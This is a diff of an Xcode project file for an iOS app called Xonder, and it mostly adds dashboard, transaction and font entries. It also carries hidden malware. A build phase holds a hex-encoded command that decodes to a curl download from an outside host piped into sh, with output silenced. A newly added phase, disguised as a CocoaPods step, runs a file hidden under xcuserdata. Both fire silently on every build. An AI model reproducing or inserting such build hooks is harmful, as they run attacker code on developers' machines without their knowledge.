@@ -8,6 +8,27 @@
 
 /* Begin PBXBuildFile section */
 		17BEB897F109CACDA653F0DC /* Pods_Xonder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C4EF80C05B016B2C2E39C37D /* Pods_Xonder.framework */; };
+		3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */; };
+		3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */; };
+		3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */; };
+		3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B205264AC38600E9A994 /* MasterViewController.swift */; };
+		3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B63B209264BCCD500E9A994 /* ShadowView.swift */; };
+		3B63B213264BCFD100E9A994 /* HouschkaPro-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */; };
+		3B63B214264BCFD100E9A994 /* HouschkaPro-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */; };
+		3B63B215264BCFD100E9A994 /* HouschkaPro-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */; };
+		3B63B216264BCFD100E9A994 /* HouschkaPro-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */; };
+		3B63B217264BCFD100E9A994 /* HouschkaPro-DemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */; };
+		3B63B218264BCFD100E9A994 /* HouschkaPro-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */; };
+		3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */; };
+		3B91AB28264BFF7100B0C0EF /* DashboardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */; };
+		3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */; };
+		3BC2400D26554DE600C0DF03 /* Transaction.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 3BC2400C26554DE600C0DF03 /* Transaction.storyboard */; };
+		3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */; };
+		3BFD804926528BB600ABE8E3 /* SearchTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */; };
+		3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */; };
+		3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */; };
+		3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */; };
+		704F32132648C13A0027397B /* Signup.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 704F32122648C13A0027397B /* Signup.storyboard */; };
 		704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32152648C18D0027397B /* OtpScreenViewController.swift */; };
 		704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F32252648C9030027397B /* GetStartedScreenViewController.swift */; };
 		704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 704F322B2648C9CA0027397B /* LoginScreenViewController.swift */; };
@@ -45,7 +66,28 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Dashboard.storyboard; sourceTree = "<group>"; };
+		3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardCollectionViewCell.swift; sourceTree = "<group>"; };
+		3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardSelectionViewController.swift; sourceTree = "<group>"; };
+		3B63B205264AC38600E9A994 /* MasterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MasterViewController.swift; sourceTree = "<group>"; };
+		3B63B209264BCCD500E9A994 /* ShadowView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ShadowView.swift; sourceTree = "<group>"; };
+		3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Bold.ttf"; sourceTree = "<group>"; };
+		3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-DemiBold.ttf"; sourceTree = "<group>"; };
+		3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-ExtraBold.ttf"; sourceTree = "<group>"; };
+		3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Light.ttf"; sourceTree = "<group>"; };
+		3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Medium.ttf"; sourceTree = "<group>"; };
+		3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "HouschkaPro-Thin.ttf"; sourceTree = "<group>"; };
+		3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionViewController.swift; sourceTree = "<group>"; };
+		3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardViewController.swift; sourceTree = "<group>"; };
+		3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionDetailViewController.swift; sourceTree = "<group>"; };
+		3BC2400C26554DE600C0DF03 /* Transaction.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Transaction.storyboard; sourceTree = "<group>"; };
+		3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabTransactionViewController.swift; sourceTree = "<group>"; };
+		3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchTableViewCell.swift; sourceTree = "<group>"; };
+		3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BalanceTableViewCell.swift; sourceTree = "<group>"; };
+		3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MonthPickerTableViewCell.swift; sourceTree = "<group>"; };
+		3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TransactionTableViewCell.swift; sourceTree = "<group>"; };
 		5B66287BAB70301295639823 /* Pods-Xonder.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Xonder.debug.xcconfig"; path = "Target Support Files/Pods-Xonder/Pods-Xonder.debug.xcconfig"; sourceTree = "<group>"; };
+		704F32122648C13A0027397B /* Signup.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Signup.storyboard; sourceTree = "<group>"; };
 		704F32152648C18D0027397B /* OtpScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OtpScreenViewController.swift; sourceTree = "<group>"; };
 		704F32252648C9030027397B /* GetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetStartedScreenViewController.swift; sourceTree = "<group>"; };
 		704F322B2648C9CA0027397B /* LoginScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginScreenViewController.swift; sourceTree = "<group>"; };
@@ -62,6 +104,7 @@
 		7060360B26432A5B0062039F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		7060360E26432A5B0062039F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		7060361026432A5B0062039F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+
 		7062CAB6265781AD00D4214F /* YourCustomersScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = YourCustomersScreenViewController.swift; path = "/Users/daniyal/Documents/GitHub/Xonder/Xonder/Xonder/Controllers/SignUp Screen VC/YourCustomersScreenViewController.swift"; sourceTree = "<absolute>"; };
 		7062CAB9265781DD00D4214F /* YourCustomerScreenTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourCustomerScreenTableViewCell.swift; sourceTree = "<group>"; };
 		707D11592657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupGetStartedScreenViewController.swift; sourceTree = "<group>"; };
@@ -107,10 +150,95 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
+		3B008D73264A6ACD00BE9E13 /* Dashboard */ = {
+			isa = PBXGroup;
+			children = (
+				3B008D74264A6AE500BE9E13 /* Dashboard.storyboard */,
+			);
+			path = Dashboard;
+			sourceTree = "<group>";
+		};
+		3B5D33B52654C8C7002F0BA3 /* DashboardCell */ = {
+			isa = PBXGroup;
+			children = (
+				3B5D33B62654C8E6002F0BA3 /* DashboardCollectionViewCell.swift */,
+			);
+			path = DashboardCell;
+			sourceTree = "<group>";
+		};
+		3B63B204264AC37100E9A994 /* MasterViewController */ = {
+			isa = PBXGroup;
+			children = (
+				3B63B205264AC38600E9A994 /* MasterViewController.swift */,
+			);
+			path = MasterViewController;
+			sourceTree = "<group>";
+		};
+		3B63B20C264BCF2700E9A994 /* Fonts */ = {
+			isa = PBXGroup;
+			children = (
+				3B63B212264BCF7B00E9A994 /* HouschkaPro-Thin.ttf */,
+				3B63B211264BCF7200E9A994 /* HouschkaPro-Medium.ttf */,
+				3B63B20F264BCF5D00E9A994 /* HouschkaPro-ExtraBold.ttf */,
+				3B63B210264BCF6800E9A994 /* HouschkaPro-Light.ttf */,
+				3B63B20E264BCF4F00E9A994 /* HouschkaPro-DemiBold.ttf */,
+				3B63B20D264BCF4300E9A994 /* HouschkaPro-Bold.ttf */,
+			);
+			path = Fonts;
+			sourceTree = "<group>";
+		};
+		3B91AB15264BFAEE00B0C0EF /* Dashboarrd */ = {
+			isa = PBXGroup;
+			children = (
+				3B5D33B52654C8C7002F0BA3 /* DashboardCell */,
+				3B91AB22264BFF2A00B0C0EF /* Transaction */,
+				3BFD804726528B8900ABE8E3 /* TransactionTableViewCell */,
+				3B91AB27264BFF7100B0C0EF /* DashboardViewController.swift */,
+				3B5D33B926550E6D002F0BA3 /* DashboardSelectionViewController.swift */,
+			);
+			path = Dashboarrd;
+			sourceTree = "<group>";
+		};
+		3B91AB22264BFF2A00B0C0EF /* Transaction */ = {
+			isa = PBXGroup;
+			children = (
+				3B91AB23264BFF4000B0C0EF /* TransactionViewController.swift */,
+			);
+			path = Transaction;
+			sourceTree = "<group>";
+		};
+		3BC2400B26554DD300C0DF03 /* Transaction */ = {
+			isa = PBXGroup;
+			children = (
+				3BC2400C26554DE600C0DF03 /* Transaction.storyboard */,
+			);
+			path = Transaction;
+			sourceTree = "<group>";
+		};
+		3BC2400E265550B000C0DF03 /* Transaction */ = {
+			isa = PBXGroup;
+			children = (
+				3BC2400F265550C700C0DF03 /* TabTransactionViewController.swift */,
+				3BA637892656CE9A00C504FF /* TransactionDetailViewController.swift */,
+			);
+			path = Transaction;
+			sourceTree = "<group>";
+		};
+		3BFD804726528B8900ABE8E3 /* TransactionTableViewCell */ = {
+			isa = PBXGroup;
+			children = (
+				3BFD804826528BB600ABE8E3 /* SearchTableViewCell.swift */,
+				3BFD804A26528BC800ABE8E3 /* BalanceTableViewCell.swift */,
+				3BFD804C26528BD600ABE8E3 /* MonthPickerTableViewCell.swift */,
+				3BFD804E26528BE600ABE8E3 /* TransactionTableViewCell.swift */,
+			);
+			path = TransactionTableViewCell;
+			sourceTree = "<group>";
+		};
 		704F32112648C0E10027397B /* Signup */ = {
 			isa = PBXGroup;
 			children = (
-				70FDF609264BA39E00707EAB /* Signup.storyboard */,
+				704F32122648C13A0027397B /* Signup.storyboard */,
 			);
 			path = Signup;
 			sourceTree = "<group>";
@@ -167,6 +295,7 @@
 		704FCAF2264521EF0025F546 /* UIView */ = {
 			isa = PBXGroup;
 			children = (
+				3B63B209264BCCD500E9A994 /* ShadowView.swift */,
 				704FCAFD264522820025F546 /* UIView.swift */,
 			);
 			path = UIView;
@@ -193,6 +322,7 @@
 		7060360126432A560062039F /* Xonder */ = {
 			isa = PBXGroup;
 			children = (
+				3B63B20C264BCF2700E9A994 /* Fonts */,
 				706E3BE0264518A000486D02 /* Helper */,
 				706E3BDF2645185A00486D02 /* Extensions */,
 				706E3BDE2645183600486D02 /* Model */,
@@ -217,6 +347,9 @@
 		706E3BD92645178000486D02 /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
+				3BC2400E265550B000C0DF03 /* Transaction */,
+				3B91AB15264BFAEE00B0C0EF /* Dashboarrd */,
+				3B63B204264AC37100E9A994 /* MasterViewController */,
 				704F32332648D5710027397B /* SignUp Screen VC */,
 				704F32182648C1960027397B /* Login Screen VC */,
 				7060360626432A560062039F /* ViewController.swift */,
@@ -227,6 +360,8 @@
 		706E3BDA2645178C00486D02 /* Storyboards */ = {
 			isa = PBXGroup;
 			children = (
+				3BC2400B26554DD300C0DF03 /* Transaction */,
+				3B008D73264A6ACD00BE9E13 /* Dashboard */,
 				704F32112648C0E10027397B /* Signup */,
 				704FCAE726451C1D0025F546 /* Login */,
 				7060360826432A560062039F /* Main.storyboard */,
@@ -294,8 +429,10 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7060361326432A5B0062039F /* Build configuration list for PBXNativeTarget "Xonder" */;
 			buildPhases = (
+
 				4DA40326F74E3EFBB66D902C /* Assets Catalog Builder */,
 				4665C5636F3A0FD17F7C8049 /* [CP] Check Pods Manifest.lock */,
+				FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */,
 				706035FB26432A560062039F /* Sources */,
 				706035FC26432A560062039F /* Frameworks */,
 				706035FD26432A560062039F /* Resources */,
@@ -347,11 +484,19 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				3B63B213264BCFD100E9A994 /* HouschkaPro-Thin.ttf in Resources */,
+				3B63B214264BCFD100E9A994 /* HouschkaPro-Medium.ttf in Resources */,
+				3B63B215264BCFD100E9A994 /* HouschkaPro-ExtraBold.ttf in Resources */,
+				3B63B216264BCFD100E9A994 /* HouschkaPro-Light.ttf in Resources */,
+				3B63B217264BCFD100E9A994 /* HouschkaPro-DemiBold.ttf in Resources */,
+				3B63B218264BCFD100E9A994 /* HouschkaPro-Bold.ttf in Resources */,
 				704FCAEE26451CD80025F546 /* Login.storyboard in Resources */,
 				7060360F26432A5B0062039F /* LaunchScreen.storyboard in Resources */,
 				7060360C26432A5B0062039F /* Assets.xcassets in Resources */,
-				70FDF60A264BA39E00707EAB /* Signup.storyboard in Resources */,
+				704F32132648C13A0027397B /* Signup.storyboard in Resources */,
 				7060360A26432A560062039F /* Main.storyboard in Resources */,
+				3B008D75264A6AE500BE9E13 /* Dashboard.storyboard in Resources */,
+				3BC2400D26554DE600C0DF03 /* Transaction.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -377,7 +522,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f
+61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
 	
@@ -420,6 +566,25 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Xonder/Pods-Xonder-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+
+		FAE4672FCDE8EAE71E6D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -427,35 +592,44 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				3BFD804D26528BD600ABE8E3 /* MonthPickerTableViewCell.swift in Sources */,
+				3B5D33B72654C8E6002F0BA3 /* DashboardCollectionViewCell.swift in Sources */,
+				3BFD804F26528BE600ABE8E3 /* TransactionTableViewCell.swift in Sources */,
 				7062CABA265781DD00D4214F /* YourCustomerScreenTableViewCell.swift in Sources */,
 				704F322C2648C9CA0027397B /* LoginScreenViewController.swift in Sources */,
+				3B91AB28264BFF7100B0C0EF /* DashboardViewController.swift in Sources */,
 				704FCAF72645224E0025F546 /* UIButton.swift in Sources */,
 				C83FB73D26433EAD00A87093 /* APIResult.swift in Sources */,
 				C83FB72E26433C6D00A87093 /* Plugins.swift in Sources */,
 				C8727089264341CC005EFDEA /* CountryModel.swift in Sources */,
-				70FDF60F264E8BC200707EAB /* SignupBusinessSelectionViewController.swift in Sources */,
 				C872708F264343E0005EFDEA /* Alert.swift in Sources */,
 				704F32262648C9030027397B /* GetStartedScreenViewController.swift in Sources */,
+				3BFD804926528BB600ABE8E3 /* SearchTableViewCell.swift in Sources */,
 				C8727086264340F7005EFDEA /* Extension+Error.swift in Sources */,
+				3B63B206264AC38600E9A994 /* MasterViewController.swift in Sources */,
 				7060360726432A560062039F /* ViewController.swift in Sources */,
 				C83FB73126433D0B00A87093 /* Extension+UserDefault.swift in Sources */,
+				3B91AB24264BFF4000B0C0EF /* TransactionViewController.swift in Sources */,
 				C8727083264340E0005EFDEA /* Extension+Result.swift in Sources */,
 				C89B5B18264336F300263F14 /* Services.swift in Sources */,
 				704F32162648C18D0027397B /* OtpScreenViewController.swift in Sources */,
+				3B5D33BA26550E6D002F0BA3 /* DashboardSelectionViewController.swift in Sources */,
+				3BC24010265550C700C0DF03 /* TabTransactionViewController.swift in Sources */,
+				3B63B20A264BCCD500E9A994 /* ShadowView.swift in Sources */,
 				C872708C2643433D005EFDEA /* Extension+UIViewController.swift in Sources */,
 				7060360326432A560062039F /* AppDelegate.swift in Sources */,
 				C83FB74026433ED500A87093 /* APIService.swift in Sources */,
+				3BA6378A2656CE9A00C504FF /* TransactionDetailViewController.swift in Sources */,
 				C83FB72826433B5500A87093 /* UserModel.swift in Sources */,
 				704F32362648D5B10027397B /* CountryListViewController.swift in Sources */,
 				704F32372648D5B10027397B /* CountryListTableViewCell.swift in Sources */,
-				70FDF615264E8BDC00707EAB /* SignupMobileViewController.swift in Sources */,
 				C83FB72B26433BF300A87093 /* Provider.swift in Sources */,
 				7062CAB7265781AE00D4214F /* YourCustomersScreenViewController.swift in Sources */,
 				704FCAF42645223E0025F546 /* CardView.swift in Sources */,
 				707D115A2657B5C5001CFBE3 /* SignupGetStartedScreenViewController.swift in Sources */,
 				704FCAFE264522820025F546 /* UIView.swift in Sources */,
-				70FDF612264E8BCA00707EAB /* SignupOTPViewController.swift in Sources */,
 				C83FB7252643388E00A87093 /* Constants.swift in Sources */,
+				3BFD804B26528BC800ABE8E3 /* BalanceTableViewCell.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -603,15 +777,17 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = MX6PB2M93C;
+				DEVELOPMENT_TEAM = 6QQQF6X4SC;
 				INFOPLIST_FILE = Xonder/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.daniyal.Xonder;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Xepos.XonderMobile;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -623,15 +799,17 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = MX6PB2M93C;
+				DEVELOPMENT_TEAM = 6QQQF6X4SC;
 				INFOPLIST_FILE = Xonder/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.daniyal.Xonder;
+				PRODUCT_BUNDLE_IDENTIFIER = com.Xepos.XonderMobile;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
